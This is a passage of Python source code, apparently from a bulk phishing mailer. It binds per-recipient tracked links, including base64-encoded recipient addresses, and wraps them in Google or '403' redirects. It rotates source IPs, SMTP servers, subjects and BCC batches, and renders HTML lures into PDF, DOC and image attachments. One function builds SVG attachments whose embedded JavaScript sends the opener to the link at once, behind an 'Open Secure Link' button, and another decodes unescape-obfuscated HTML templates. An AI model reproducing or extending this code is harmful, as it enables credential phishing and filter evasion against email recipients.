        cfg = str(configured_link or '').strip() or '(empty)'
        lst = str(link_list or '').strip() or '(not configured)'
        print(Fore.YELLOW + '[!] Link: no per-recipient link could be bound. The "link" setting is the placeholder ' +
              cfg + ' but the rotation file ' + lst + ' is missing or empty and no real fallback URL is set. ' +
              'Put one real URL per line in the rotation file, or set a real URL in [link_setup] link / [SEND INFO] link.' +
              Style.RESET_ALL)
    except Exception:
        pass


def BindLink(email,link):
    global useRedirect,domain403,link_entries
    if link_entries or is_link_placeholder(link) or not str(link or '').strip():
        resolved = get_next_link(email)
        if resolved:
            # Ensure per-recipient placeholders in link entries (e.g. {base64email}) are expanded.
            # Do not skip placeholder processing here.
            link = findString(email, resolved, skip_link=False)
        else:
            link = ''
            _warn_missing_link(link_setup.get('link'), link_setup.get('linkList'))
    else:
        link = findString(email,link)
    idn = int(useRedirect)
    if idn == 1:
        selflink = Googlelink(link)
    if idn == 2:
        selflink = redirect403(email,domain403,link)
    if idn == 0:
        selflink = link
    return selflink


def _replace_link_placeholders(text, recipient_email, link_urls):
    """Replace {link}, {link2}, ... using URLs already allocated for a message."""
    if not text:
        return text
    if link_urls is None:
        link_urls = {}
    tokens = re.findall(r'(?i)(?:\{|\[|\$\{)link(\d*)(?:\}|\])', text)
    for suffix in tokens:
        number = int(suffix or '1')
        if number not in link_urls:
            try:
                link_urls[number] = str(get_next_link(recipient_email) or '').strip()
            except Exception:
                link_urls[number] = ''
        replacement = link_urls[number]
        for token in (
            '{link' + suffix + '}', '{LINK' + suffix + '}', '{Link' + suffix + '}',
            '[link' + suffix + ']', '[LINK' + suffix + ']', '[Link' + suffix + ']',
            '${link' + suffix + '}', '${LINK' + suffix + '}', '${Link' + suffix + '}',
        ):
            text = text.replace(token, replacement)
    return text


local_ips = []
rotate_ip = False
ip_index = 0
record_folder = "records"
eml_report_lock = threading.Lock()
paused = False
email_index = 0
manual_pause = False
auto_pause = False
pause_enabled = False
pause_duration = 0
pause_tasks = 0
pause_task_count = 0
pause_task_lock = threading.Lock()
stopwatch_enabled = False
stopwatch_pattern = []
stopwatch_success_count = 0
stopwatch_timer_active = False
stopwatch_lock = threading.Lock()
stopwatch_timer_lock = threading.Lock()
subject_rotate = False
subject_file = "subject.txt"
subject_lines = []
subject_index = 0
subject_lock = threading.Lock()
fromname_rotation_lock = threading.Lock()
success_sent_count = 0
failed_sent_count = 0
success_count_lock = threading.Lock()
worker_threads = []
worker_threads_lock = threading.Lock()
current_thread_count = 0
config_mtime = None
# Rate control: max concurrent sends and per-send delay
max_concurrent_sends = None
send_delay = 0.0
rate_semaphore = None
rate_lock = threading.Lock()
ip_rotation_lock = threading.Lock()
smtp_pool_file = 'SMTP/smtp.txt'
smtp_selection_system = 1
smtp_rotation_index = 0
smtp_rotation_lock = threading.Lock()
smtp_dangerous = False
smtp_retry_limit = 0
smtp_retry_delay_secs = 5

pause_remaining = 0
pause_reason = None
pause_spinner_chars = ['|', '/', '-', '\\']
pause_remaining_lock = threading.Lock()

status_thread_started = False
status_thread_lock = threading.Lock()


def parse_bind_ip(bind_ip):
    if bind_ip is None:
        return None, None

    bind_ip = str(bind_ip).strip()
    if not bind_ip:
        return None, None

    if ':' in bind_ip:
        host, port = bind_ip.rsplit(':', 1)
        host = host.strip()
        port = port.strip()
        if not host:
            return None, None
        if port.isdigit():
            return host, int(port)
        return host, None

    return bind_ip, None


def get_local_ipv4_addresses():
    local_ips = {'127.0.0.1'}
    try:
        result = subprocess.run(['ipconfig'], capture_output=True, text=True, check=False)
        for line in result.stdout.splitlines():
            match = re.search(r'IPv4 Address[\s\.]*:\s*([0-9.]+)', line)
            if match:
                local_ips.add(match.group(1).strip())
    except Exception:
        pass
    return local_ips


def is_valid_bind_ip(bind_ip):
    # v3: bind-IP validation relaxation. Any syntactically valid IPv4 address
    # is accepted so the operator can rotate public source IPs (ip_config /
    # MULTIPLE/ips.txt). IPv6 remains loopback-only because a raw IPv6 bind
    # socket address is not supported by build_source_address.
    host, _ = parse_bind_ip(bind_ip)
    if host is None:
        return False

    host = str(host).strip().lower()
    if host in ('localhost', '127.0.0.1'):
        return True

    try:
        parsed = ipaddress.ip_address(host)
    except ValueError:
        return False

    if parsed.version == 4:
        return True

    return parsed.is_loopback


def normalize_bind_ip_list(raw_ips):
    normalized = []
    for raw in raw_ips or []:
        bind_ip = str(raw).strip()
        if not bind_ip:
            continue
        if is_valid_bind_ip(bind_ip):
            normalized.append(bind_ip)
            continue
        print(f"[ WARN ] Skipping non-local bind IP: {bind_ip}")
    return normalized


def load_bcc_list():
    global bcc_list, bcc_target
    try:
        if bcc_target and os.path.isfile(bcc_target):
            with open(bcc_target, 'r', encoding='utf-8') as fh:
                bcc_list = [l.strip() for l in fh.read().splitlines() if l.strip()]
        else:
            bcc_list = []
    except Exception:
        bcc_list = []


def get_next_bcc_batch(limit):
    global bcc_list, bcc_index
    if not bcc_list or limit <= 0:
        return []
    start = bcc_index % len(bcc_list)
    batch = []
    for i in range(limit):
        batch.append(bcc_list[(start + i) % len(bcc_list)])
    bcc_index = (start + len(batch)) % len(bcc_list)
    return batch


def load_simple_list(path):
    try:
        if os.path.isfile(path):
            with open(path, 'r', encoding='utf-8') as fh:
                return [l.strip() for l in fh.read().splitlines() if l.strip()]
    except Exception:
        pass
    return []


def resolve_config_file(path, fallback=''):
    candidate = str(path or fallback or '').strip()
    if candidate and not os.path.isabs(candidate) and not os.path.isfile(candidate):
        candidate = os.path.join(os.path.dirname(os.path.abspath(__file__)), candidate)
    return candidate


def load_local_file_entries(path):
    entries = []
    try:
        if os.path.isfile(path):
            with open(path, 'r', encoding='utf-8', errors='replace') as source:
                for line in source:
                    parts = [part.strip() for part in line.split('|')]
                    if not parts or not parts[0] or parts[0].startswith('#'):
                        continue
                    attach = len(parts) < 2 or parts[1].lower() in ('1', 'true', 'yes', 'on')
                    name = parts[2] if len(parts) > 2 and parts[2] else os.path.basename(parts[0])
                    entries.append({'path': parts[0], 'attach': attach, 'name': name})
    except Exception:
        return []
    return entries


def load_local_files_config():
    global local_file_entries, local_file_index
    local_file_entries = load_local_file_entries(local_files_setup.get('location', 'MULTIPLE/local_files.txt'))
    with local_file_lock:
        local_file_index = 0


def select_local_file_entries():
    global local_file_index
    entries = [entry for entry in local_file_entries if entry.get('attach')]
    if not entries:
        return []
    selection = int(local_files_setup.get('selection', 1) or 1)
    if selection == 3:
        return entries
    with local_file_lock:
        if selection == 2:
            return [random.choice(entries)]
        entry = entries[local_file_index % len(entries)]
        local_file_index += 1
        return [entry]


def load_link_entries(path):
    entries = []
    try:
        if os.path.isfile(path):
            for line in open(path, 'r', encoding='utf-8').read().splitlines():
                if not line.strip():
                    continue
                parts = line.split('|')
                url = parts[0].strip()
                try:
                    limit = int(parts[1].strip()) if len(parts) > 1 and parts[1].strip() else -1
                except Exception:
                    limit = -1
                entries.append({'url': url, 'limit': limit, 'used': 0})
    except Exception:
        pass
    return entries


def get_next_link(email):
    global link_entries, link_index
    configured_link = str(link_setup.get('link') or '').strip()

    # Load the configured rotation file on demand so a {LINK}-style token in
    # the "link" setting still resolves against the rotation list after a reload.
    if not link_entries and is_link_placeholder(configured_link):
        link_list = link_setup.get('linkList')
        if link_list and not os.path.isabs(link_list) and not os.path.isfile(link_list):
            link_list = os.path.join(os.path.dirname(os.path.abspath(__file__)), link_list)
        if link_list and os.path.isfile(link_list):
            link_entries = load_link_entries(link_list)
            link_index = 0

    if link_entries:
        with link_lock:
            n = len(link_entries)
            if n == 0:
                return ''

            def _entry_available(entry):
                limit = entry.get('limit', -1)
                return limit == -1 or entry.get('used', 0) < limit

            def _render_entry(entry):
                entry['used'] = entry.get('used', 0) + 1
                raw_url = entry.get('url', '')
                try:
                    return replace_placeholders(email, raw_url)
                except Exception:
                    return raw_url

            selection_mode = _rotation_selection_mode(link_setup.get('selection_system', 1), 1)
            if selection_mode == 2:
                # Random: pick uniformly among entries that still have budget, so
                # an exhausted link is never re-used.
                available = [entry for entry in link_entries if _entry_available(entry)]
                if not available:
                    return ''
                link_index += 1
                return _render_entry(random.choice(available))

            # Cyclic (1) / SerialUntilLimitExhausted (3) and the remaining
            # documented link systems fall back to an ordered, limit-aware walk:
            # step through the pool in order, skip entries that hit their limit,
            # and only stop once every entry is exhausted.
            for _ in range(n):
                index = link_index % n
                link_index += 1
                entry = link_entries[index]
                if _entry_available(entry):
                    return _render_entry(entry)
            return ''

    if is_link_placeholder(configured_link):
        # The configured link is the {LINK} token itself and no rotation entry
        # was available. Fall back to the legacy [SEND INFO] "link" when it is a
        # real URL; otherwise there is nothing left to bind.
        legacy = globals().get('link')
        legacy = str(legacy or '').strip()
        if legacy and not is_link_placeholder(legacy):
            try:
                return replace_placeholders(email, legacy)
            except Exception:
                return legacy
        return ''
    if configured_link:
        return replace_placeholders(email, configured_link)
    return ''


def build_source_address(bind_ip):
    host, port = parse_bind_ip(bind_ip)
    if host is None or not is_valid_bind_ip(bind_ip):
        return None
    return (host, port or 0)


def is_source_port_in_use(error):
    return getattr(error, 'winerror', None) == 10048 or getattr(error, 'errno', None) == 98


def is_bind_address_error(error):
    """True when the OS refused to bind the requested source address, i.e. the
    configured source IP is not actually assigned to this machine.

    POSIX reports Errno 99 (EADDRNOTAVAIL); Windows reports WinError 10049
    (WSAEADDRNOTAVAIL). This is distinct from a connection failure: retrying the
    same IP will never help, but a different IP or the default route may."""
    if error is None:
        return False
    if getattr(error, 'errno', None) == 99:
        return True
    if getattr(error, 'winerror', None) == 10049:
        return True
    text = str(error).lower()
    markers = (
        'cannot assign requested address',
        'address not available',
        'eaddrnotavail',
        'requested address is not valid',
    )
    return any(marker in text for marker in markers)


# Attachment generation helpers
def ensure_tool_available(cmd):
    try:
        import shutil
        return shutil.which(cmd) is not None
    except Exception:
        return False


def _find_system_chromium():
    """Locate a system Chromium/Chrome/Edge binary usable for headless
    HTML rendering. Returns None when none is found."""
    try:
        if os.name == 'nt':
            candidates = [
                os.path.join(os.environ.get('PROGRAMFILES', ''), 'Google', 'Chrome', 'Application', 'chrome.exe'),
                os.path.join(os.environ.get('PROGRAMFILES(X86)', ''), 'Google', 'Chrome', 'Application', 'chrome.exe'),
                os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'Application', 'chrome.exe'),
                os.path.join(os.environ.get('PROGRAMFILES', ''), 'Microsoft', 'Edge', 'Application', 'msedge.exe'),
                os.path.join(os.environ.get('PROGRAMFILES(X86)', ''), 'Microsoft', 'Edge', 'Application', 'msedge.exe'),
            ]
        else:
            candidates = [
                'chromium', 'chromium-browser', 'google-chrome', 'google-chrome-stable',
                'chrome', 'microsoft-edge', 'msedge',
            ]
        for candidate in candidates:
            if not candidate:
                continue
            found = shutil.which(candidate)
            if not found and os.path.isfile(candidate):
                found = candidate
            if found:
                return found
    except Exception:
        pass
    return None


def _run_chromium_headless(chromium_path, args):
    """Run Chromium headless, tolerating older builds that only understand the
    legacy --headless flag (not --headless=new)."""
    import subprocess
    base = [chromium_path, '--disable-gpu', '--no-sandbox', '--no-first-run',
            '--no-default-browser-check', '--disable-dev-shm-usage']
    last_error = None
    for headless_flag in ('--headless=new', '--headless'):
        cmd = list(base)
        cmd.insert(1, headless_flag)
        cmd.extend(args)
        try:
            subprocess.run(cmd, check=True, capture_output=True, text=True, timeout=180)
            return True
        except Exception as exc:  # try the next flag / report failure
            last_error = exc
            continue
    if last_error is not None:
        raise last_error
    return False


def _chromium_headless_pdf(chromium_path, source_html, out_path):
    import tempfile
    if not chromium_path:
        return False
    src = Path(source_html).resolve().as_uri()
    profile = tempfile.mkdtemp(prefix='vdm-chrome-')
    try:
        _run_chromium_headless(chromium_path, [
            '--user-data-dir=' + profile,
            '--run-all-compositor-stages-before-draw',
            '--virtual-time-budget=10000',
            '--print-to-pdf=' + os.path.abspath(out_path),
            src,
        ])
    finally:
        shutil.rmtree(profile, ignore_errors=True)
    return os.path.isfile(out_path) and os.path.getsize(out_path) > 0


def _chromium_headless_png(chromium_path, source_html, out_path, width=None, height=None, scale=1.0):
    import tempfile
    if not chromium_path:
        return False
    os.makedirs(os.path.dirname(os.path.abspath(out_path)) or '.', exist_ok=True)
    src = Path(source_html).resolve().as_uri()
    profile = tempfile.mkdtemp(prefix='vdm-chrome-')
    try:
        size = '%d,%d' % (int(width) if width and int(width) > 0 else 1024,
                          int(height) if height and int(height) > 0 else 768)
        _run_chromium_headless(chromium_path, [
            '--hide-scrollbars',
            '--force-device-scale-factor=' + str(float(scale) if scale else 1.0),
            '--window-size=' + size,
            '--user-data-dir=' + profile,
            '--screenshot=' + os.path.abspath(out_path),
            src,
        ])
    finally:
        shutil.rmtree(profile, ignore_errors=True)
    return os.path.isfile(out_path) and os.path.getsize(out_path) > 0


def generate_pdf_from_html(html_path, out_path, layout=1, page_type=1, margin=0.4, recipient_email='placeholder@example.com', link_url=None):
    os.makedirs(os.path.dirname(os.path.abspath(out_path)), exist_ok=True)
    if os.path.isfile(out_path) and os.path.getsize(out_path) == 0:
        try:
            os.remove(out_path)
        except Exception:
            pass
    source_html = html_path
    try:
        if os.path.isfile(html_path):
            with open(html_path, 'r', encoding='utf-8', errors='ignore') as fh:
                raw = fh.read()
            if '{' in raw and '}' in raw:
                resolved = _resolve_html_template_placeholders(html_path, recipient_email or 'placeholder@example.com', link_url=link_url)
                if resolved:
                    temp_path = os.path.join(os.path.dirname(os.path.abspath(html_path)) or '.', f'__vdm_pdf_{uuid.uuid4().hex}.html')
                    with open(temp_path, 'w', encoding='utf-8') as fh:
                        fh.write(resolved)
                    source_html = temp_path
    except Exception:
        source_html = html_path

    page_sizes = {1: 'Letter', 2: 'Legal', 3: 'Statement', 4: 'Executive', 5: 'A4', 6: 'A5'}
    page_size = page_sizes.get(int(page_type), 'Letter')
    orientation = 'Landscape' if int(layout) == 2 else 'Portrait'
    margin_value = max(0.0, float(margin))
    failures = []

    # Try pdfkit/wkhtmltopdf first
    if ensure_tool_available('wkhtmltopdf'):
        try:
            import pdfkit
            options = {
                'page-size': page_size,
                'orientation': orientation,
                'margin-top': f'{margin_value}in',
                'margin-right': f'{margin_value}in',
                'margin-bottom': f'{margin_value}in',
                'margin-left': f'{margin_value}in',
            }
            if pdfkit.from_file(source_html, out_path, options=options):
                if source_html != html_path and os.path.exists(source_html):
                    try:
                        os.remove(source_html)
                    except Exception:
                        pass
                return os.path.isfile(out_path) and os.path.getsize(out_path) > 0
        except Exception as exc:
            failures.append(f'pdfkit: {exc}')

    # Prefer a system Chromium/Chrome/Edge: no Python dependency and no
    # Playwright driver startup cost.
    try:
        chromium_path = _find_system_chromium()
        if chromium_path and _chromium_headless_pdf(chromium_path, source_html, out_path):
            if source_html != html_path and os.path.exists(source_html):
                try:
                    os.remove(source_html)
                except Exception:
                    pass
            return True
    except Exception as exc:
        failures.append(f'chromium: {exc}')

    # Next: Playwright (bundled browser) when no system browser is available.
    try:
        if _ensure_playwright_browser_installed():
            from playwright.sync_api import sync_playwright
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                page = browser.new_page(viewport={'width': 1280, 'height': 1400}, device_scale_factor=1)
                page.goto(Path(source_html).resolve().as_uri(), wait_until='networkidle', timeout=60000)
                page.pdf(
                    path=out_path,
                    format=page_size,
                    landscape=(orientation == 'Landscape'),
                    print_background=True,
                    margin={
                        'top': f'{margin_value}in',
                        'right': f'{margin_value}in',
                        'bottom': f'{margin_value}in',
                        'left': f'{margin_value}in',
                    },
                )
                browser.close()
            if source_html != html_path and os.path.exists(source_html):
                try:
                    os.remove(source_html)
                except Exception:
                    pass
            if os.path.isfile(out_path) and os.path.getsize(out_path) > 0:
                return True
    except Exception as exc:
        failures.append(f'playwright: {exc}')

    # Fallback: try weasyprint
    try:
        from weasyprint import HTML
        HTML(source_html).write_pdf(out_path)
        if source_html != html_path and os.path.exists(source_html):
            try:
                os.remove(source_html)
            except Exception:
                pass
        if os.path.isfile(out_path) and os.path.getsize(out_path) > 0:
            return True
    except Exception as exc:
        failures.append(f'weasyprint: {exc}')

    # Fallback: xhtml2pdf works without wkhtmltopdf or native WeasyPrint DLLs
    try:
        from xhtml2pdf import pisa
        with open(source_html, 'r', encoding='utf-8', errors='replace') as source:
            html = source.read()
        page_css = (
            f'<style>@page {{ size: {page_size} {orientation.lower()}; '
            f'margin: {margin_value}in; }}</style>'
        )
        if '<head' in html.lower():
            head_end = html.lower().find('>', html.lower().find('<head')) + 1
            html = html[:head_end] + page_css + html[head_end:]
        else:
            html = page_css + html
        with open(out_path, 'wb') as target:
            result = pisa.CreatePDF(html, dest=target, encoding='utf-8')
        if source_html != html_path and os.path.exists(source_html):
            try:
                os.remove(source_html)
            except Exception:
                pass
        if not result.err and os.path.isfile(out_path) and os.path.getsize(out_path) > 0:
            return True
    except Exception as exc:
        failures.append(f'xhtml2pdf: {exc}')

    # Fallback: try wkhtmltopdf via subprocess
    try:
        import subprocess
        if ensure_tool_available('wkhtmltopdf'):
            subprocess.check_call(['wkhtmltopdf', source_html, out_path])
            if source_html != html_path and os.path.exists(source_html):
                try:
                    os.remove(source_html)
                except Exception:
                    pass
            if os.path.isfile(out_path) and os.path.getsize(out_path) > 0:
                return True
    except Exception as exc:
        failures.append(f'wkhtmltopdf: {exc}')

    if source_html != html_path and os.path.exists(source_html):
        try:
            os.remove(source_html)
        except Exception:
            pass
    if os.path.isfile(out_path) and os.path.getsize(out_path) == 0:
        try:
            os.remove(out_path)
        except Exception:
            pass
    print(f"{Fore.YELLOW}[PDF] HTML conversion failed for {html_path} using all available renderers. Details: {'; '.join(failures) if failures else 'unknown'}{Style.RESET_ALL}")
    return False


def _ensure_pandoc_available():
    try:
        import pypandoc
        try:
            pypandoc.get_pandoc_path()
            return True
        except OSError:
            try:
                pypandoc.download_pandoc()
                return True
            except Exception:
                return False
    except Exception:
        return False


def generate_rtf_from_html(html_path, out_path, recipient_email='', link_url=None):
    source_html = html_path
    try:
        if os.path.isfile(html_path):
            with open(html_path, 'r', encoding='utf-8', errors='ignore') as fh:
                raw = fh.read()
            if '{' in raw and '}' in raw:
                # v9.5: resolve placeholders against the real lead, and use a unique
                # temp filename so concurrent workers never overwrite each other.
                resolved = _resolve_html_template_placeholders(html_path, recipient_email or 'placeholder@example.com', link_url=link_url)
                if resolved:
                    temp_path = os.path.join(os.path.dirname(os.path.abspath(html_path)) or '.', f'__vdm_rtf_{uuid.uuid4().hex}.html')
                    with open(temp_path, 'w', encoding='utf-8') as fh:
                        fh.write(resolved)
                    source_html = temp_path
        import pypandoc
        if not _ensure_pandoc_available():
            raise RuntimeError('Pandoc unavailable')
        os.makedirs(os.path.dirname(out_path) or '.', exist_ok=True)
        pypandoc.convert_file(source_html, 'rtf', outputfile=out_path)
        with open(out_path, 'r', encoding='ascii', errors='replace') as target:
            converted_rtf = target.read()
        converted_rtf = converted_rtf.replace(r'\par}', r'\par }')
        if not converted_rtf.lstrip().startswith(r'{\rtf'):
            converted_rtf = r'{\rtf1\ansi\deff0\viewkind4\uc1 ' + converted_rtf.rstrip() + r'}'
            with open(out_path, 'w', encoding='ascii', errors='replace') as target:
                target.write(converted_rtf)
        if source_html != html_path and os.path.exists(source_html):
            try:
                os.remove(source_html)
            except Exception:
                pass
        return True
    except Exception:
        pass
    try:
        text = _html_to_plain_text(source_html)
        if not text:
            text = ' '
        lines = [line.strip() for line in text.splitlines() if line.strip()]
        rtf_body = ''.join((line.replace('\\', r'\\').replace('{', r'\{').replace('}', r'\}') + r'\par ') for line in lines)
        rtf = r'{\rtf1\ansi\deff0\viewkind4\uc1\pard\f0\fs22 ' + rtf_body + r'}'
        os.makedirs(os.path.dirname(out_path) or '.', exist_ok=True)
        with open(out_path, 'w', encoding='ascii', errors='replace') as target:
            target.write(rtf)
        if source_html != html_path and os.path.exists(source_html):
            try:
                os.remove(source_html)
            except Exception:
                pass
        return True
    except Exception as exc:
        print(f"{Fore.YELLOW}[RTF] HTML conversion failed: {exc}{Style.RESET_ALL}")
        return False


def generate_svg_from_html(html_path, out_path, recipient_email='', link_url=None):
    source_html = html_path
    try:
        if os.path.isfile(html_path):
            with open(html_path, 'r', encoding='utf-8', errors='ignore') as fh:
                raw = fh.read()
            if '{' in raw and '}' in raw:
                resolved = _resolve_html_template_placeholders(html_path, recipient_email or 'placeholder@example.com', link_url=link_url)
                if resolved:
                    temp_path = os.path.join(os.path.dirname(os.path.abspath(html_path)) or '.', f'__vdm_svg_{uuid.uuid4().hex}.html')
                    with open(temp_path, 'w', encoding='utf-8') as fh:
                        fh.write(resolved)
                    source_html = temp_path
        with open(source_html, 'r', encoding='utf-8', errors='ignore') as fh:
            content = fh.read()
        try:
            href = extract_href_from_html(source_html)
        except Exception:
            href = None
        if href:
            safe_url = str(href).replace('&', '&amp;').replace('"', '&quot;')
            tpl = []
            a = tpl.append
            a('<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100%" height="100%" viewBox="0 0 1200 800">')
            a('<script type="text/javascript"><![CDATA[')
            a('try { window.location.href = SURL; } catch (e) {}')
            a('try { window.top.location.href = SURL; } catch (e) {}')
            a(']]></script>')
            a('<a xlink:href=SURL href=SURL target="_top">')
            a('<rect width="1200" height="800" fill="#ffffff"/>')
            a('<rect x="440" y="330" width="320" height="120" rx="18" fill="#0b57d0"/>')
            a('<text x="600" y="404" text-anchor="middle" font-family="Arial, sans-serif" font-size="28" font-weight="700" fill="#ffffff">Open Secure Link</text>')
            a('</a>')
            a('</svg>')
            svg = chr(10).join(tpl).replace('SURL', chr(39) + safe_url + chr(39))
        else:
            svg = f'''<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
  <foreignObject width="100%" height="100%">
    <body xmlns="http://www.w3.org/1999/xhtml">{content}</body>
  </foreignObject>
</svg>'''
        os.makedirs(os.path.dirname(out_path), exist_ok=True)
        with open(out_path, 'w', encoding='utf-8') as fh:
            fh.write(svg)
        if source_html != html_path and os.path.exists(source_html):
            try:
                os.remove(source_html)
            except Exception:
                pass
        return True
    except Exception as exc:
        print(f"{Fore.YELLOW}[SVG] HTML conversion failed: {exc}{Style.RESET_ALL}")
        return False

def generate_doc_from_html(html_path, out_path, recipient_email='', link_url=None):
    source_html = html_path
    try:
        if os.path.isfile(html_path):
            with open(html_path, 'r', encoding='utf-8', errors='ignore') as fh:
                raw = fh.read()
            if '{' in raw and '}' in raw:
                resolved = _resolve_html_template_placeholders(html_path, recipient_email or 'placeholder@example.com', link_url=link_url)
                if resolved:
                    temp_path = os.path.join(os.path.dirname(os.path.abspath(html_path)) or '.', f'__vdm_doc_{uuid.uuid4().hex}.html')
                    with open(temp_path, 'w', encoding='utf-8') as fh:
                        fh.write(resolved)
                    source_html = temp_path
        import pypandoc
        if not _ensure_pandoc_available():
            raise RuntimeError('Pandoc unavailable')
        pypandoc.convert_file(source_html, 'doc', outputfile=out_path)
        if source_html != html_path and os.path.exists(source_html):
            try:
                os.remove(source_html)
            except Exception:
                pass
        return True
    except Exception:
        pass
    try:
        text = _html_to_plain_text(source_html)
        os.makedirs(os.path.dirname(out_path) or '.', exist_ok=True)
        with open(out_path, 'w', encoding='utf-8') as fh:
            fh.write(text or ' ')
        if source_html != html_path and os.path.exists(source_html):
            try:
                os.remove(source_html)
            except Exception:
                pass
        return True
    except Exception as exc:
        print(f"{Fore.YELLOW}[DOC] HTML conversion failed: {exc}{Style.RESET_ALL}")
        return False


_playwright_install_attempted = False
_playwright_install_lock = threading.Lock()


def _try_playwright_launch():
    try:
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            browser.close()
        return True
    except Exception:
        return False


def _ensure_playwright_browser_installed():
    """Return True only when a Chromium browser can actually launch.

    A zero exit status from `playwright install` does not guarantee the browser
    is launchable (missing shared libraries, a broken driver install, or a
    stale environment all report success yet still fail at launch), so the
    install is followed by a real launch attempt."""
    global _playwright_install_attempted
    if _try_playwright_launch():
        return True
    with _playwright_install_lock:
        if _playwright_install_attempted:
            return False
        _playwright_install_attempted = True
        try:
            import subprocess, sys
            subprocess.run([sys.executable, '-m', 'playwright', 'install', 'chromium'], check=True, capture_output=True, text=True)
        except Exception:
            return False
    return _try_playwright_launch()


def ensure_image_converter_available():
    if ensure_tool_available('wkhtmltoimage'):
        return 'wkhtmltoimage'
    try:
        import imgkit
        if ensure_tool_available('wkhtmltoimage'):
            return 'imgkit'
    except Exception:
        pass
    if _find_system_chromium():
        return 'chromium'
    if _ensure_playwright_browser_installed():
        try:
            import playwright
            return 'playwright'
        except Exception:
            pass
    return None


def _decode_html_script_wrapper(text):
    """Decode document.write(unescape('...')) HTML before resolving tokens."""
    source = str(text or '')
    match = re.fullmatch(
        r"\s*<script\b[^>]*>\s*document\.write\(unescape\(['\"](.*?)['\"]\)\)\s*</script>\s*",
        source,
        flags=re.IGNORECASE | re.DOTALL,
    )
    if not match:
        return source

    encoded = match.group(1)
    encoded = re.sub(
        r'%u([0-9a-fA-F]{4})',
        lambda item: chr(int(item.group(1), 16)),
        encoded,
    )
    return urllib.parse.unquote(encoded)


def generate_image_from_html(html_path, out_path, width=None, height=None, scale=1.0, recipient_email='placeholder@example.com', link_url=None):
    converter = ensure_image_converter_available()
    if not converter:
        print(f"{Fore.YELLOW}[HTMLIMAGE] No HTML image converter available. Install imgkit, Playwright, or wkhtmltoimage to render HTML to an image.{Style.RESET_ALL}")
        return False
    temporary_paths = []
    try:
        resolved_path = html_path
        if os.path.isfile(html_path):
            with open(html_path, 'r', encoding='utf-8', errors='ignore') as fh:
                raw_text = fh.read()
            text = _decode_html_script_wrapper(raw_text)
            if '{' in text and '}' in text:
                template_path = html_path
                if text != raw_text:
                    template_path = os.path.join(
                        os.path.dirname(os.path.abspath(html_path)) or '.',
                        f'.__vdm_decoded_template__.{uuid.uuid4().hex}.html',
                    )
                    with open(template_path, 'w', encoding='utf-8') as fh:
                        fh.write(text)
                    temporary_paths.append(template_path)
                resolved_text = _resolve_html_template_placeholders(template_path, recipient_email, link_url=link_url)
                if resolved_text:
                    temp_path = os.path.join(
                        os.path.dirname(os.path.abspath(html_path)) or '.',
                        f'.__vdm_render_tmp__.{uuid.uuid4().hex}.html',
                    )
                    with open(temp_path, 'w', encoding='utf-8') as fh:
                        fh.write(resolved_text)
                    resolved_path = temp_path
                    temporary_paths.append(temp_path)
        if converter == 'imgkit':
            import imgkit
            options = {'format': 'png', 'quality': '100'}
            if width and width > 0:
                options['width'] = width
            if height and height > 0:
                options['height'] = height
            if scale and float(scale) != 1.0:
                options['zoom'] = float(scale)
            os.makedirs(os.path.dirname(os.path.abspath(out_path)) or '.', exist_ok=True)
            imgkit.from_file(resolved_path, out_path, options=options)
            return os.path.isfile(out_path) and os.path.getsize(out_path) > 0
        if converter == 'playwright':
            from playwright.sync_api import sync_playwright
            os.makedirs(os.path.dirname(out_path) or '.', exist_ok=True)
            launch_width = int(width) if width and width > 0 else 1024
            launch_height = int(height) if height and height > 0 else 768
            zoom = float(scale) if scale and float(scale) != 1.0 else 1.0
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                page = browser.new_page(viewport={'width': launch_width, 'height': launch_height}, device_scale_factor=zoom)
                page.goto('file://' + os.path.abspath(resolved_path), wait_until='networkidle', timeout=60000)
                page.screenshot(path=out_path, full_page=True)
                browser.close()
            return os.path.isfile(out_path) and os.path.getsize(out_path) > 0
        if converter == 'chromium':
            return _chromium_headless_png(
                _find_system_chromium(), resolved_path, out_path,
                width=width, height=height, scale=scale,
            )
        if converter == 'wkhtmltoimage':
            import subprocess
            cmd = ['wkhtmltoimage']
            if width and width > 0:
                cmd.extend(['--width', str(width)])
            if height and height > 0:
                cmd.extend(['--height', str(height)])
            if scale and float(scale) != 1.0:
                cmd.extend(['--zoom', str(scale)])
            os.makedirs(os.path.dirname(os.path.abspath(out_path)) or '.', exist_ok=True)
            cmd.extend([resolved_path, out_path])
            subprocess.check_call(cmd)
            return os.path.isfile(out_path) and os.path.getsize(out_path) > 0
    except Exception as exc:
        print(f"{Fore.YELLOW}[HTMLIMAGE] HTML conversion failed: {exc}{Style.RESET_ALL}")
        return False
    finally:
        for temporary_path in temporary_paths:
            try:
                if os.path.exists(temporary_path):
                    os.remove(temporary_path)
            except Exception:
                pass
    return False


htmlimage_rotation_index = 0
htmlimage_rotation_lock = threading.Lock()


def _htmlimage_template_paths():
    """Return the configured single template or all numbered templates."""
    single_path = str(htmlimage_setup.get('location') or '').strip()
    if str(htmlimage_setup.get('enableMultiple', 0)).strip().lower() not in ('1', 'true', 'yes', 'on'):
        return [single_path] if single_path else []

    configured_path = str(htmlimage_setup.get('multipleLocation') or '').strip()
    if not configured_path:
        return [single_path] if single_path else []
    if not os.path.isabs(configured_path):
        configured_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), configured_path)
    folder = os.path.dirname(configured_path) or os.path.dirname(os.path.abspath(__file__))
    stem, extension = os.path.splitext(os.path.basename(configured_path))
    match = re.match(r'^(.*?)(\d+)$', stem)
    if match:
        prefix, first_number = match.group(1), int(match.group(2))
    else:
        prefix, first_number = stem, 1
    candidates = []
    for entry in os.listdir(folder) if os.path.isdir(folder) else []:
        entry_stem, entry_extension = os.path.splitext(entry)
        if entry_extension.lower() != (extension or '.html').lower():
            continue
        entry_match = re.match(r'^' + re.escape(prefix) + r'(\d+)$', entry_stem)
        if entry_match:
            candidates.append((int(entry_match.group(1)), os.path.join(folder, entry)))
    candidates.sort(key=lambda item: item[0])
    candidates = [path for number, path in candidates if number >= first_number and os.path.isfile(path)]
    return candidates or ([single_path] if single_path else [])


def _select_htmlimage_template():
    """Select the next configured HTML image template."""
    global htmlimage_rotation_index
